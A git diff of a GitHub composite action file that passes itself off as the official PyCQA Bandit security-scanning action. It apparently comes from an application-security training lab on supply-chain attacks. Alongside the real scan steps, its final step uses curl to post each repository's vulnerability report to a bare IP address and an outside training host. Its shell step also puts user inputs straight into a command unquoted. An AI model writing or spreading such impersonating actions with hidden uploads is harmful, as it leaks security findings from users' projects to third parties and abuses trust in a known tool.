@@ -1,29 +1,110 @@
-name: Bandit Action
+name: Bandit by PyCQA
+description: The official Bandit Action developed by PyCQA
+author: '@PyCQA'
 
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-  schedule:
-    - cron: '15 20 * * 0'
+branding:
+  icon: 'shield'
+  color: 'black'
 
-jobs:
-  bandit:
-    permissions:
-      contents: read
-      security-events: write
-      actions: read
+inputs: 
+  configfile:
+    description: |
+      Optional config file to use for selecting plugins and overriding defaults
+    required: false
+    default: ''
+  profile:
+    description: |
+      Profile to use (defaults to executing all tests)
+    required: false
+    default: ''
+  tests:
+    description: |
+      Comma-separated list of test IDs to run
+    required: false
+    default: ''
+  skips:
+    description: |
+      Comma-separated list of test IDs to skip
+    required: false
+    default: ''
+  severity:
+    description: |
+      Report only issues of a given severity level or higher. "all" and "low"
+      are likely to produce the same results, but it is possible for rules to
+      be undefined which will not be listed in "low". Options include:
+      {all, high, medium, low}
+    required: false
+    default: ''
+  confidence:
+    description: |
+      Report only issues of a given confidence level or higher. "all" and "low"
+      are likely to produce the same results, but it is possible for rules to
+      be undefined which will not be listed in "low". Options include:
+      {all, high, medium, low}
+    required: false
+    default: ''
+  exclude:
+    description: |
+      Comma-separated list of paths (glob patterns supported) to exclude from
+      scan (note that these are in addition to the excluded paths provided in
+      the config file)
+    required: false
+    default: '.svn,CVS,.bzr,.hg,.git,__pycache__,.tox,.eggs,*.egg'
+  baseline:
+    description: |
+      Path of a baseline report to compare against (only JSON-formatted files
+      are accepted)
+    required: false
+    default: ''
+  ini:
+    description: |
+      Path to a .bandit file that supplies command line arguments
+    required: false
+    default: ''
+  targets:
+    description: |
+      Source file(s) or directory(s) to be tested
+    required: true
+    default: '.'
 
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
+runs:
+  using: composite
+  steps:
+    - name: Set up Python 3.8
+      uses: actions/setup-python@v5
+      with:
+        python-version: 3.8
 
-      - name: Bandit Scan
-        uses: mdegis/bandit-action@v1.1
+    - name: Install Bandit
+      shell: bash
+      run: pip install bandit[sarif]
 
-      - name: Upload results and notify
-        run: |
-          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json" http://35.219.131.62:8880/callback
-          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json" http://8xbhipazcs8cb2fpstc5x.appsecengineer.training:8880/callback
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Run Bandit
+      shell: bash
+      run: |
+        CONFIGFILE=${{ inputs.configfile }}
+        PROFILE=${{ inputs.profile }}
+        TESTS=${{ inputs.tests }}
+        SKIPS=${{ inputs.skips }}
+        SEVERITY=${{ inputs.severity }}
+        CONFIDENCE=${{ inputs.confidence }}
+        BASELINE=${{ inputs.baseline }}
+        INI=${{ inputs.ini }}
+        EXCLUDE=${{ inputs.exclude }}
+        TARGETS=${{ inputs.targets }}
+
+        bandit $CONFIGFILE $PROFILE $TESTS $SKIPS $SEVERITY $CONFIDENCE -x $EXCLUDE $BASELINE $INI -r $TARGETS -f sarif -o results.sarif || true
+
+    - name: Upload SARIF file
+      uses: github/codeql-action/upload-sarif@v3
+      with:
+        sarif_file: results.sarif
+
+    - name: Send results to server
+      shell: bash
+      run: |
+        curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.sarif" http://35.219.131.62:8880/callback
+        curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.sarif" http://8xbhipazcs8cb2fpstc5x.appsecengineer.training:8880/callback
